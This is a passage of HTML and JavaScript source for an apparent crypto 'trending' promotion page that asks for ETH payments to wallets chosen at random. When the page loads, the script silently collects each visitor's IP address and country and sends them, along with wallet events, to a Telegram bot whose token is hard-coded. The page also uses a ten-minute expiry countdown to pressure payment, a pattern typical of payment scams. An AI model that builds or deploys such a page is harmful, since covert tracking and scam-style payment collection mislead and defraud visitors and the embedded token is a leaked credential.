<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ETH Trending - Premium Platform</title>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }

        :root {
            /* Dark theme (default) */
            --bg-primary: #0f0f0f;
            --bg-secondary: rgba(20, 20, 30, 0.95);
            --bg-tertiary: rgba(255, 255, 255, 0.05);
            --bg-quaternary: rgba(255, 255, 255, 0.02);
            --text-primary: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.8);
            --text-tertiary: rgba(255, 255, 255, 0.6);
            --text-placeholder: rgba(255, 255, 255, 0.5);
            --border-primary: rgba(255, 255, 255, 0.1);
            --border-secondary: rgba(255, 255, 255, 0.2);
            --shadow-primary: rgba(0, 0, 0, 0.4);
            --shadow-secondary: rgba(0, 0, 0, 0.2);
        }

        [data-theme="light"] {
            /* Light theme */
            --bg-primary: #f8fafc;
            --bg-secondary: rgba(255, 255, 255, 0.95);
            --bg-tertiary: rgba(0, 0, 0, 0.03);
            --bg-quaternary: rgba(0, 0, 0, 0.01);
            --text-primary: #1f2937;
            --text-secondary: rgba(31, 41, 55, 0.8);
            --text-tertiary: rgba(31, 41, 55, 0.6);
            --text-placeholder: rgba(31, 41, 55, 0.5);
            --border-primary: rgba(0, 0, 0, 0.1);
            --border-secondary: rgba(0, 0, 0, 0.2);
            --shadow-primary: rgba(0, 0, 0, 0.1);
            --shadow-secondary: rgba(0, 0, 0, 0.05);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        /* Animated Background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(120, 53, 168, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 111, 97, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%);
            animation: backgroundShift 20s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes backgroundShift {
            0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
            33% { opacity: 0.8; transform: scale(1.05) rotate(1deg); }
            66% { opacity: 0.9; transform: scale(0.95) rotate(-1deg); }
        }

        .theme-toggle {
            position: absolute;
            top: 15px;
            right: 15px;
            z-index: 1000;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-primary);
            border-radius: 20px;
            padding: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
            box-shadow: 0 2px 10px var(--shadow-secondary);
        }

        .theme-toggle:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 15px var(--shadow-primary);
        }

        .theme-toggle .toggle-track {
            width: 40px;
            height: 20px;
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            border-radius: 10px;
            position: relative;
            transition: all 0.3s ease;
        }

        .theme-toggle .toggle-thumb {
            width: 16px;
            height: 16px;
            background: white;
            border-radius: 50%;
            position: absolute;
            top: 2px;
            left: 2px;
            transition: transform 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 8px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
        }

        [data-theme="light"] .theme-toggle .toggle-thumb {
            transform: translateX(20px);
        }

        .persistent-timer {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1000;
            background: var(--bg-secondary);
            border: 2px solid rgba(124, 53, 168, 0.5);
            border-radius: 16px;
            padding: 15px 20px;
            backdrop-filter: blur(20px);
            box-shadow: 0 8px 30px var(--shadow-primary);
            transition: all 0.3s ease;
        }

        .persistent-timer.warning {
            border-color: rgba(255, 111, 97, 0.7);
            animation: pulse 2s infinite;
        }

        .persistent-timer.expired {
            border-color: rgba(239, 68, 68, 0.8);
            background: rgba(239, 68, 68, 0.1);
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); box-shadow: 0 8px 30px var(--shadow-primary); }
            50% { transform: scale(1.05); box-shadow: 0 12px 40px rgba(255, 111, 97, 0.3); }
        }

        .timer-label {
            font-size: 0.8rem;
            color: var(--text-tertiary);
            margin-bottom: 5px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .timer-display {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-family: 'Monaco', 'Menlo', monospace;
            letter-spacing: 2px;
        }

        .timer-status {
            font-size: 0.7rem;
            color: var(--text-tertiary);
            margin-top: 5px;
            font-weight: 500;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
            background: var(--bg-secondary);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-primary);
            border-radius: 24px;
            padding: 40px;
            box-shadow: 
                0 30px 80px var(--shadow-primary),
                inset 0 1px 0 var(--border-secondary);
            margin-top: 20px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            animation: containerFadeIn 1s ease-out;
        }

        @keyframes containerFadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, var(--border-secondary), transparent);
            animation: shimmer 3s infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .logo {
            font-size: 3rem;
            font-weight: 800;
            background: linear-gradient(135deg, #7c35a8, #ff6f61, #7877c6);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-align: center;
            margin-bottom: 40px;
            animation: gradientFlow 3s ease-in-out infinite;
            letter-spacing: -2px;
        }

        @keyframes gradientFlow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .step {
            display: none;
            animation: stepSlideIn 0.6s cubic-bezier(0.23, 1, 0.32, 1);
        }

        .step.active { display: block; }

        @keyframes stepSlideIn {
            from { 
                opacity: 0; 
                transform: translateX(30px) scale(0.95); 
            }
            to { 
                opacity: 1; 
                transform: translateX(0) scale(1); 
            }
        }

        .step-progress {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
            padding: 20px 0;
        }

        .progress-dot {
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: var(--border-secondary);
            margin: 0 8px;
            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
            position: relative;
        }

        .progress-dot::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: transparent;
            transition: all 0.3s ease;
        }

        .progress-dot.active {
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            box-shadow: 0 0 20px rgba(124, 53, 168, 0.5);
            transform: scale(1.2);
        }

        .progress-dot.active::after {
            background: #ffffff;
        }

        .progress-dot.done {
            background: linear-gradient(135deg, #10b981, #059669);
            box-shadow: 0 0 15px rgba(16, 185, 129, 0.4);
        }

        .progress-dot.done::after {
            background: #ffffff;
        }

        .progress-line {
            flex: 1;
            height: 2px;
            background: var(--border-primary);
            position: relative;
            overflow: hidden;
        }

        .progress-line.active::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            background: linear-gradient(90deg, #7c35a8, #ff6f61);
            animation: progressFill 0.8s ease-out;
        }

        @keyframes progressFill {
            from { width: 0%; }
            to { width: 100%; }
        }

        h2 {
            color: var(--text-primary);
            margin-bottom: 30px;
            text-align: center;
            font-size: 2rem;
            font-weight: 700;
            opacity: 0;
            animation: titleFadeIn 0.8s ease-out 0.2s forwards;
        }

        @keyframes titleFadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-group {
            margin-bottom: 25px;
            opacity: 0;
            animation: formGroupFadeIn 0.6s ease-out forwards;
        }

        .form-group:nth-child(2) { animation-delay: 0.1s; }
        .form-group:nth-child(3) { animation-delay: 0.2s; }
        .form-group:nth-child(4) { animation-delay: 0.3s; }

        @keyframes formGroupFadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-weight: 500;
            font-size: 0.95rem;
        }

        input, textarea {
            width: 100%;
            padding: 16px 20px;
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            font-size: 16px;
            background: var(--bg-tertiary);
            color: var(--text-primary);
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #7c35a8;
            box-shadow: 0 0 0 3px rgba(124, 53, 168, 0.2);
            background: var(--bg-quaternary);
            transform: translateY(-2px);
        }

        input::placeholder, textarea::placeholder {
            color: var(--text-placeholder);
        }

        .btn {
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px;
            transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(124, 53, 168, 0.3);
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #ff6f61, #7c35a8);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 8px 25px rgba(124, 53, 168, 0.4);
        }

        .btn:hover::before {
            opacity: 1;
        }

        .btn span {
            position: relative;
            z-index: 1;
        }

        .btn:disabled {
            background: var(--border-primary);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-back {
            background: linear-gradient(135deg, #374151, #4b5563);
            box-shadow: 0 4px 15px rgba(55, 65, 81, 0.3);
        }

        .btn-paid {
            background: linear-gradient(135deg, #10b981, #059669);
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }

        .pricing-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 30px 0;
        }

        .pricing-category {
            border: 2px solid var(--border-primary);
            border-radius: 16px;
            padding: 25px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
            text-align: center;
            background: var(--bg-quaternary);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        .pricing-category::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, var(--border-secondary), transparent);
            transition: left 0.5s ease;
        }

        .pricing-category:hover {
            border-color: #7c35a8;
            transform: translateY(-5px) scale(1.02);
            box-shadow: 0 10px 30px rgba(124, 53, 168, 0.2);
        }

        .pricing-category:hover::before {
            left: 100%;
        }

        .pricing-category.selected {
            border-color: #7c35a8;
            background: rgba(124, 53, 168, 0.1);
            box-shadow: 0 0 30px rgba(124, 53, 168, 0.3);
        }

        .pricing-category h4 {
            font-size: 1.3rem;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .price-options {
            display: none;
            margin-top: 25px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s ease;
        }

        .price-options.active {
            display: block;
            opacity: 1;
            transform: translateY(0);
        }

        .price-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 18px 24px;
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            margin: 12px 0;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
            background: var(--bg-quaternary);
            backdrop-filter: blur(5px);
        }

        .price-item:hover {
            border-color: #7c35a8;
            background: rgba(124, 53, 168, 0.05);
            transform: translateX(5px);
        }

        .price-item.selected {
            border-color: #7c35a8;
            background: rgba(124, 53, 168, 0.1);
            box-shadow: 0 0 20px rgba(124, 53, 168, 0.2);
        }

        .eth-price {
            font-weight: 700;
            font-size: 1.1rem;
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .wallet-container {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-primary);
            border-radius: 16px;
            padding: 30px;
            margin: 25px 0;
            backdrop-filter: blur(10px);
        }

        .wallet-address {
            background: linear-gradient(135deg, #1f2937, #374151);
            color: #ffffff;
            padding: 20px;
            border-radius: 12px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.95rem;
            word-break: break-all;
            cursor: pointer;
            position: relative;
            transition: all 0.3s ease;
            border: 1px solid var(--border-primary);
        }

        .wallet-address:hover {
            background: linear-gradient(135deg, #374151, #4b5563);
            transform: scale(1.01);
        }

        .copy-button {
            position: absolute;
            top: 15px;
            right: 15px;
            background: linear-gradient(135deg, #7c35a8, #ff6f61);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .copy-button:hover {
            transform: scale(1.1);
        }

        .notification {
            padding: 20px;
            border-radius: 12px;
            margin: 20px 0;
            backdrop-filter: blur(10px);
            border: 1px solid;
            animation: notificationSlide 0.5s ease-out;
        }

        @keyframes notificationSlide {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .notification-success {
            background: rgba(16, 185, 129, 0.1);
            color: #10b981;
            border-color: rgba(16, 185, 129, 0.3);
        }

        .notification-error {
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border-color: rgba(239, 68, 68, 0.3);
        }

        .notification-info {
            background: rgba(59, 130, 246, 0.1);
            color: #3b82f6;
            border-color: rgba(59, 130, 246, 0.3);
        }

        .loading-spinner {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid var(--border-primary);
            border-top: 3px solid #7c35a8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .user-info {
            background: var(--bg-tertiary);
            padding: 15px;
            border-radius: 12px;
            font-size: 0.9rem;
            color: var(--text-tertiary);
            margin-bottom: 25px;
            text-align: center;
            border: 1px solid var(--border-primary);
        }

        .floating-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .particle {
            position: absolute;
            background: rgba(124, 53, 168, 0.3);
            border-radius: 50%;
            animation: float 6s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        @media (max-width: 768px) {
            .pricing-grid { grid-template-columns: 1fr; }
            .container { margin: 10px; padding: 25px; padding-top: 50px; }
            .logo { font-size: 2.2rem; }
            h2 { font-size: 1.6rem; }
            .persistent-timer { 
                position: relative; 
                margin: 10px;
                margin-bottom: 20px;
            }
            .theme-toggle {
                top: 10px;
                right: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="floating-particles" id="particles"></div>
    
    <!-- Persistent Timer -->
    <div class="persistent-timer" id="persistentTimer" style="display: none;">
        <div class="timer-label">Wallet Expires In</div>
        <div class="timer-display" id="persistentTimerDisplay">10:00</div>
        <div class="timer-status" id="persistentTimerStatus">Wallet Address Active</div>
    </div>

    <div class="container">
        <!-- Theme Toggle inside container -->
        <div class="theme-toggle" onclick="toggleTheme()" title="Toggle theme">
            <div class="toggle-track">
                <div class="toggle-thumb">
                    <span id="themeIcon">🌙</span>
                </div>
            </div>
        </div>

        <div class="logo">ETH Trending</div>
        <div class="user-info" id="userInfo">Loading location...</div>

        <div class="step-progress">
            <div class="progress-dot active" id="dot1"></div>
            <div class="progress-line" id="line1"></div>
            <div class="progress-dot" id="dot2"></div>
            <div class="progress-line" id="line2"></div>
            <div class="progress-dot" id="dot3"></div>
            <div class="progress-line" id="line3"></div>
            <div class="progress-dot" id="dot4"></div>
        </div>

        <!-- Step 1: Project Submission -->
        <div class="step active" id="step1">
            <h2>Submit Your Project</h2>
            <div class="form-group">
                <label>Project Name *</label>
                <input type="text" id="projectName" placeholder="Enter your project name" required>
            </div>
            <div class="form-group">
                <label>Contract Address *</label>
                <input type="text" id="contractAddress" placeholder="Enter Ethereum contract address" required>
            </div>
            <div class="form-group">
                <label>Project Logo/Image</label>
                <input type="file" id="projectPhoto" accept="image/*">
                <small style="color: var(--text-tertiary); font-size: 0.85rem;">Upload project logo or promotional image (optional)</small>
            </div>
            <div class="form-group">
                <label>Telegram (optional)</label>
                <input type="text" id="telegram" placeholder="@your_telegram_handle">
            </div>
            <div class="form-group">
                <label>X/Twitter (optional)</label>
                <input type="text" id="twitter" placeholder="@your_twitter_handle">
            </div>
            <div class="form-group">
                <label>Website (optional)</label>
                <input type="text" id="website" placeholder="https://your-website.com">
            </div>
            <div class="form-group">
                <label>Project Description</label>
                <textarea id="projectDescription" placeholder="Tell us about your project..." rows="4"></textarea>
            </div>
            <button class="btn" onclick="nextStep(1)"><span>Continue to Pricing →</span></button>
        </div>

        <!-- Step 2: Pricing Selection -->
        <div class="step" id="step2">
            <h2>Select Trending Package</h2>
            <div class="pricing-grid">
                <div class="pricing-category" onclick="selectCategory('top15')">
                    <h4>🏆 Top 15 Trending</h4>
                    <p style="color: var(--text-tertiary);">Premium visibility</p>
                    <small style="color: var(--text-tertiary);">Standard tier</small>
                </div>
                <div class="pricing-category" onclick="selectCategory('top7')">
                    <h4>⭐ Top 7 Trending</h4>
                    <p style="color: #ff6f61; font-weight: bold;">Maximum impact!</p>
                    <small style="color: var(--text-tertiary);">Premium tier</small>
                </div>
            </div>

            <div class="price-options" id="top15Options">
                <h4 style="margin-bottom: 20px; color: var(--text-secondary);">Top 15 Trending Packages:</h4>
                <div class="price-item" onclick="selectPrice('top15_4h', 0.12)">
                    <span>4 Hours Trending</span>
                    <span class="eth-price">0.12 ETH</span>
                </div>
                <div class="price-item" onclick="selectPrice('top15_8h', 0.215)">
                    <span>8 Hours Trending</span>
                    <span class="eth-price">0.215 ETH</span>
                </div>
                <div class="price-item" onclick="selectPrice('top15_16h', 0.42)">
                    <span>16 Hours Trending</span>
                    <span class="eth-price">0.42 ETH</span>
                </div>
                <div class="price-item" onclick="selectPrice('top15_24h', 0.62)">
                    <span>24 Hours Trending</span>
                    <span class="eth-price">0.62 ETH</span>
                </div>
            </div>

            <div class="price-options" id="top7Options">
                <h4 style="margin-bottom: 20px; color: var(--text-secondary);">Top 7 Trending Packages:</h4>
                <div class="price-item" onclick="selectPrice('top7_4h', 0.17)">
                    <span>4 Hours Trending</span>
                    <span class="eth-price">0.17 ETH</span>
                </div>
                <div class="price-item" onclick="selectPrice('top7_8h', 0.32)">
                    <span>8 Hours Trending</span>
                    <span class="eth-price">0.32 ETH</span>
                </div>
                <div class="price-item" onclick="selectPrice('top7_16h', 0.61)">
                    <span>16 Hours Trending</span>
                    <span class="eth-price">0.61 ETH</span>
                </div>
                <div class="price-item" onclick="selectPrice('top7_24h', 0.8)">
                    <span>24 Hours Trending</span>
                    <span class="eth-price">0.8 ETH</span>
                </div>
            </div>

            <div id="selectedPackage"></div>
            <button class="btn btn-back" onclick="prevStep()"><span>← Back</span></button>
            <button class="btn" onclick="nextStep(2)" id="continueBtn" disabled><span>Continue to Payment →</span></button>
        </div>

        <!-- Step 3: Payment -->
        <div class="step" id="step3">
            <h2>ETH Payment</h2>
            <div id="orderSummary"></div>
            
            <div class="wallet-container">
                <!-- Wallet content will be dynamically inserted here -->
            </div>

            <button class="btn btn-back" onclick="prevStep()"><span>← Back</span></button>
            <button class="btn btn-paid" onclick="checkPayment()"><span>Payment Sent - Verify →</span></button>
        </div>

        <!-- Step 4: Verification -->
        <div class="step" id="step4">
            <h2>Payment Verification</h2>
            <div id="paymentStatus">
                <div class="loading-spinner"></div> Checking Ethereum blockchain...
            </div>
            <div id="finalResult"></div>
            <button class="btn" onclick="recheckPayment()" id="recheckBtn" style="display: none;"><span>🔄 Check Again</span></button>
            <button class="btn btn-back" onclick="startOver()" id="restartBtn" style="display: none;"><span>🔄 Start Over</span></button>
        </div>
    </div>

    <script>
        let currentStep = 1;
        let selectedPackage = '';
        let selectedPrice = 0;
        let userCountry = 'Unknown';
        let userIP = 'Unknown';
        let assignedWallet = '';
        let walletTimer = null;
        let timeRemaining = 600; // 10 minutes in seconds
        let walletStartTime = null;

        const TELEGRAM_BOT = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
        const TELEGRAM_CHAT = '1129109001';

        // Available wallet addresses
        const WALLET_ADDRESSES = [
            '0x62b9a996d1203F2b62B1452A6E22256De42C3Ff0',
            '0x388130DC8806512e18e6a9B433098f94d5510F8c',
            '0x031B958a69Dcea6b5e7FE702a36e5B11BFb5418c',
            '0x735EE1f68B1203F8CF1f3ea10811C5E032e91041'
        ];

        // Theme management
        function initTheme() {
            const savedTheme = localStorage.getItem('theme');
            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
            
            if (savedTheme) {
                document.documentElement.setAttribute('data-theme', savedTheme);
            } else if (!prefersDark) {
                document.documentElement.setAttribute('data-theme', 'light');
            }
            
            updateThemeIcon();
        }

        function toggleTheme() {
            const currentTheme = document.documentElement.getAttribute('data-theme');
            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
            
            document.documentElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
            updateThemeIcon();
        }

        function updateThemeIcon() {
            const theme = document.documentElement.getAttribute('data-theme');
            const icon = document.getElementById('themeIcon');
            icon.textContent = theme === 'light' ? '☀️' : '🌙';
        }

        // Listen for system theme changes
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
            if (!localStorage.getItem('theme')) {
                document.documentElement.setAttribute('data-theme', e.matches ? 'dark' : 'light');
                updateThemeIcon();
            }
        });

        // Persistent timer functions
        function showPersistentTimer() {
            document.getElementById('persistentTimer').style.display = 'block';
        }

        function hidePersistentTimer() {
            document.getElementById('persistentTimer').style.display = 'none';
        }

        function updatePersistentTimer() {
            const timerElement = document.getElementById('persistentTimerDisplay');
            const statusElement = document.getElementById('persistentTimerStatus');
            const containerElement = document.getElementById('persistentTimer');
            
            if (timeRemaining <= 0) {
                timerElement.textContent = '00:00';
                statusElement.textContent = 'Wallet Address Expired';
                containerElement.className = 'persistent-timer expired';
                return;
            }

            const minutes = Math.floor(timeRemaining / 60);
            const seconds = timeRemaining % 60;
            const timeString = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            
            timerElement.textContent = timeString;
            
            if (timeRemaining <= 120) {
                containerElement.className = 'persistent-timer warning';
                statusElement.textContent = '⚠️ Wallet Expires Soon!';
            } else {
                containerElement.className = 'persistent-timer';
                statusElement.textContent = 'Wallet Address Active';
            }
        }

        // Timer that continues even when page is not focused
        function startPersistentTimer() {
            if (!assignedWallet) {
                console.log('No wallet assigned, cannot start timer');
                return;
            }
            
            walletStartTime = Date.now();
            timeRemaining = 600; // Reset to 10 minutes
            
            if (walletTimer) {
                clearInterval(walletTimer);
            }

            walletTimer = setInterval(() => {
                // Calculate time remaining based on actual elapsed time
                const elapsedTime = Math.floor((Date.now() - walletStartTime) / 1000);
                timeRemaining = Math.max(0, 600 - elapsedTime);
                
                updatePersistentTimer();
                updateTimerDisplay(); // Update in-wallet timer if visible

                if (timeRemaining <= 0) {
                    expireWallet();
                }
            }, 1000);
            
            showPersistentTimer();
            updatePersistentTimer();
            
            console.log('Timer started for wallet:', assignedWallet);
        }

        function stopPersistentTimer() {
            if (walletTimer) {
                clearInterval(walletTimer);
                walletTimer = null;
            }
            hidePersistentTimer();
        }

        // Wallet management functions
        function assignRandomWallet() {
            const randomIndex = Math.floor(Math.random() * WALLET_ADDRESSES.length);
            assignedWallet = WALLET_ADDRESSES[randomIndex];
            timeRemaining = 600; // Reset to 10 minutes
            walletStartTime = Date.now();
            
            console.log('Wallet assigned:', assignedWallet);
            sendTelegram(`🏦 WALLET ASSIGNED\n👤 ${userCountry} (${userIP})\n💎 Address: ${assignedWallet}\n⏰ Expires in 10 minutes`);
            
            return assignedWallet;
        }

        function updateTimerDisplay() {
            const minutes = Math.floor(timeRemaining / 60);
            const seconds = timeRemaining % 60;
            const timeString = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            
            const timerElement = document.getElementById('walletTimer');
            if (timerElement) {
                timerElement.textContent = timeString;
                
                // Add warning color when less than 2 minutes remaining
                if (timeRemaining <= 120) {
                    timerElement.style.color = '#ff6f61';
                    timerElement.style.fontWeight = 'bold';
                } else {
                    timerElement.style.color = '#7c35a8';
                    timerElement.style.fontWeight = 'normal';
                }
            }
        }

        function expireWallet() {
            clearInterval(walletTimer);
            
            // Show expiration notification
            const walletContainer = document.querySelector('.wallet-container');
            if (walletContainer) {
                walletContainer.innerHTML = `
                    <div class="notification notification-error">
                        <h4>⏰ Wallet Address Expired</h4>
                        <p>Your assigned wallet address has expired. Please get a new address to continue with payment.</p>
                        <button class="btn" onclick="refreshWallet()" style="margin-top: 15px;">
                            <span>🔄 Get New Wallet Address</span>
                        </button>
                    </div>
                `;
            }

            sendTelegram(`⏰ WALLET EXPIRED\n👤 ${userCountry} (${userIP})\n💎 Expired Address: ${assignedWallet}`);
        }

        function refreshWallet() {
            assignRandomWallet();
            startPersistentTimer();
            updateWalletDisplay();
            
            sendTelegram(`🔄 WALLET REFRESHED\n👤 ${userCountry} (${userIP})\n💎 New Address: ${assignedWallet}`);
        }

        function updateWalletDisplay() {
            const walletContainer = document.querySelector('.wallet-container');
            if (walletContainer && assignedWallet) {
                walletContainer.innerHTML = `
                    <h4 style="margin-bottom: 20px; color: var(--text-secondary);">💎 Send ETH to this address:</h4>
                    <div class="wallet-address" onclick="copyWallet()">
                        ${assignedWallet}
                        <button class="copy-button" onclick="event.stopPropagation(); copyWallet();">📋 Copy</button>
                    </div>
                    <div id="copyFeedback" style="color: #10b981; margin-top: 15px; opacity: 0; transition: opacity 0.3s;">✅ Address copied to clipboard!</div>
                    
                    <div class="notification" style="background: rgba(124, 53, 168, 0.1); border-color: rgba(124, 53, 168, 0.3); color: #7c35a8; margin: 20px 0;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <strong>⏰ Address expires in:</strong>
                            <span id="walletTimer" style="font-size: 1.2em; font-weight: bold; font-family: 'Monaco', 'Menlo', monospace;">${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}</span>
                        </div>
                        <small>This address will expire in 10 minutes. Complete payment before expiration or request a new address.</small>
                    </div>
                    
                    <div class="notification notification-info">
                        <strong>Payment Instructions:</strong><br><br>
                        1. Copy the wallet address above<br>
                        2. Send the exact ETH amount to this address<br>
                        3. Complete payment within 10 minutes<br>
                        4. Wait 2-3 minutes for blockchain confirmation<br>
                        5. Click "Payment Sent" button below
                    </div>
                `;
                
                // Force update the timer display immediately
                setTimeout(() => {
                    updateTimerDisplay();
                }, 100);
            }
        }

        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 15; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.width = Math.random() * 4 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
                particlesContainer.appendChild(particle);
            }
        }

        // Initialize
        window.onload = async function() {
            initTheme();
            createParticles();
            assignRandomWallet(); // Assign wallet on page load
            
            console.log('Page loaded, wallet assigned:', assignedWallet);
            
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                userCountry = data.country_name || 'Unknown';
                userIP = data.ip || 'Unknown';
                
                document.getElementById('userInfo').innerHTML = 
                    `🌍 ${userCountry} | 📍 ${userIP} | 🕐 ${new Date().toLocaleTimeString()}`;

                sendTelegram(`🆕 NEW VISITOR - ETH TRENDING\n🌍 ${userCountry}\n📍 ${userIP}\n💎 Assigned Wallet: ${assignedWallet}\n🕐 ${new Date().toLocaleString()}`);
            } catch (e) {
                console.log('Location fetch failed:', e);
                document.getElementById('userInfo').innerHTML = '🌍 Private | 🕐 ' + new Date().toLocaleTimeString();
            }
        };

        async function sendTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT,
                        text: message
                    })
                });
            } catch (e) {
                console.log('Telegram notification failed:', e);
            }
        }

        async function sendTelegramPhoto(file, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT);
                formData.append('photo', file);
                formData.append('caption', caption);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.log('Telegram photo upload failed:', e);
            }
        }

        function nextStep(step) {
            if (step === 1) {
                const name = document.getElementById('projectName').value.trim();
                const contract = document.getElementById('contractAddress').value.trim();
                
                if (!name || !contract) {
                    alert('Please fill all required fields');
                    return;
                }

                const telegram = document.getElementById('telegram').value.trim();
